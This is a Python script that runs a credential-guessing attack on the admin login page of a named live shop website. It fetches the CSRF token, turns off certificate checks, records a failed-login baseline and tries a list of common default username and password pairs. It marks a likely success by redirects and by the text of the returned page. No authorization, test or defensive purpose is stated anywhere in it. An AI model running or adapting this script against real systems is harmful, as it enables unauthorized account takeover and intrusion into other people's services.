import re, sys, requests

BASE = "https://ofa77.shop/module/admin/unionshop/user/login"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Origin": "https://ofa77.shop",
    "Referer": "https://ofa77.shop/module/admin/unionshop/user/login",
})
s.verify = False
import urllib3
urllib3.disable_warnings()

def get_token():
    r = s.get(BASE, timeout=15)
    m = re.search(r'name="_token"\s*value="([^"]+)"', r.text)
    return (m.group(1) if m else None), r.status_code

creds = [
    ("admin","admin"),("admin","123456"),("admin","admin123"),("admin","password"),
    ("admin","admin@123"),("admin","admin888"),("admin","p@ssw0rd"),("admin","admin123456"),
    ("admin","111111"),("admin","000000"),("admin","12345678"),("admin","admin2024"),
    ("admin","ofa77"),("admin","Admin@123"),("Admin","123456"),("root","123456"),
]

print("=== probe wrong-cred baseline ===")
tok, st = get_token()
print("token:", bool(tok), "GET status:", st)
if tok:
    r = s.post(BASE, data={"_token":tok,"username":"__no_such_user__","password":"__x__"},
               headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},
               allow_redirects=False, timeout=15)
    print("baseline status:", r.status_code, "len:", len(r.text))
    print("baseline body head:", r.text[:300].replace("\n"," "))

print("\n=== credential attempts ===")
for u,p in creds:
    tok, _ = get_token()
    if not tok:
        print(f"{u}/{p}: NO_TOKEN"); continue
    r = s.post(BASE, data={"_token":tok,"username":u,"password":p},
               headers={"Content-Type":"application/x-www-form-urlencoded"},
               allow_redirects=False, timeout=15)
    loc = r.headers.get("Location","")
    body = r.text
    # success heuristics: redirect to dashboard/module, or contains success text, or no longer a login form
    success_markers = ["/module/admin", "dashboard", "成功", "logout", "退出"]
    looks_success = (r.status_code in (301,302,303,307) and loc and "login" not in loc) \
                    or ("退出" in body and 'name="password"' not in body)
    err_marker = ("錯誤" in body) or ("错误" in body) or ("帳號" in body and "密碼" in body)
    flag = "  <== SUCCESS?" if looks_success else ""
    print(f"{u}/{p}: {r.status_code} loc={loc[:40]!r} err={err_marker}{flag} body[:120]={body[:120]!r}")
